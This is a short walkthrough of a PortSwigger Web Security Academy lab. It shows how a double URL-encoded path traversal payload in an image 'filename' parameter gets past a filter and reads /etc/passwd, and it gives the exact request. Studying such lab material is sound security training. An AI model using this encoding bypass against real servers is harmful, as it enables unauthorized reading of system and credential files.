
# File path traversal, traversal sequences stripped with superfluous URL-decode

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.

---------------------------------------------

References: 

- https://portswigger.net/web-security/file-path-traversal



![img](images/File%20path%20traversal,%20traversal%20sequences%20stripped%20with%20superfluous%20URL-decode/1.png)

---------------------------------------------

To retrieve an image the application uses a GET request with the parameter filename:



![img](images/File%20path%20traversal,%20traversal%20sequences%20stripped%20with%20superfluous%20URL-decode/2.png)



To retrieve /etc/passwd we need to use double URL encode the characters:

```
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```



![img](images/File%20path%20traversal,%20traversal%20sequences%20stripped%20with%20superfluous%20URL-decode/3.png)